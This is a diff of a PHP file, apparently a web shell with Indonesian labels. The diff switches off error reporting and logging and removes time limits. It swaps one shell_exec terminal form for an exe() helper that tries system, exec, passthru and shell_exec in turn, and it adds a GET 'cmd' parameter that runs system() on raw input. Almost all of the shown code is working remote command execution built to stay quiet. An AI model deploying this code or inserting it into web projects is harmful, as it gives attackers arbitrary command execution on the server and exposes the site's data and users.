@@ -1,6 +1,13 @@
 <?php
-ini_set('log_errors', 0);
-ini_set('display_errors', 0);
+error_reporting(0);
+set_time_limit(0);
+@clearstatcache();
+@ini_set('error_log', null);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+
 if (session_status() === PHP_SESSION_NONE) {
     session_start();
 }
@@ -1260,36 +1267,6 @@ echo "<p><strong>HTTPS:</strong> " . (isset($_SERVER['HTTPS']) ? 'Ya' : 'Tidak')
 	<tr>
 		<td>
 
-<form method="post">
-    <label for="terminalCommand"> Terminal :</label><br>
-    <input type="text" id="terminalCommand" name="terminalCommand" required><br><br>
-    <input type="submit" value="Eksekusi">
-</form>
-
-<br>
-
-<?php
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Mengambil input tanpa pembersihan
-    $terminalCommand = trim($_POST['terminalCommand']);
-    
-    // Menjalankan perintah terminal
-    $output = shell_exec($terminalCommand);
-    
-    // Menampilkan output dari perintah yang dijalankan
-    if ($output === null) {
-        // Mendapatkan informasi kesalahan terakhir
-        $error = error_get_last();
-        echo "<pre>Perintah tidak dapat dieksekusi atau tidak valid. <bt> Kesalahan: " . htmlspecialchars($error['message']) . "</pre>";
-    } else {
-        echo "<pre>$output</pre>";
-    }
-}
-?>
-
-
-
-
 
     <form method="POST" action="">
         <label for="dir">Periksa Direktori Writable:</label>
@@ -1349,6 +1326,65 @@ if (isset($_POST['submit'])) {
 }
 ?>
     </pre>
+
+
+
+<?php
+
+function exe($cmd) {
+    if (function_exists('system')) {
+        @ob_start();
+        @system($cmd);
+        $buff = @ob_get_contents();
+        @ob_end_clean();
+
+        return $buff;
+    } elseif (function_exists('exec')) {
+        @exec($cmd, $results);
+        $buff = '';
+        foreach ($results as $result) {
+            $buff .= $result;
+        }
+
+        return $buff;
+    } elseif (function_exists('passthru')) {
+        @ob_start();
+        @passthru($cmd);
+        $buff = @ob_get_contents();
+        @ob_end_clean();
+
+        return $buff;
+    } elseif (function_exists('shell_exec')) {
+        $buff = @shell_exec($cmd);
+
+        return $buff;
+    }
+}
+
+?>
+
+                    <h3>Terminal : </h3>
+                    <form>
+                        <input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="id | uname -a | whoami | heked">
+                    </form>
+
+
+
+<?php
+//cmd
+if (isset($_GET['cmd'])) {
+    echo "<pre class='text-white'>";
+    echo system($_GET['cmd']);
+    echo '</pre>';
+    exit;
+}
+?>
+
+
+<br>
+
+
+
 
 
 		</td>
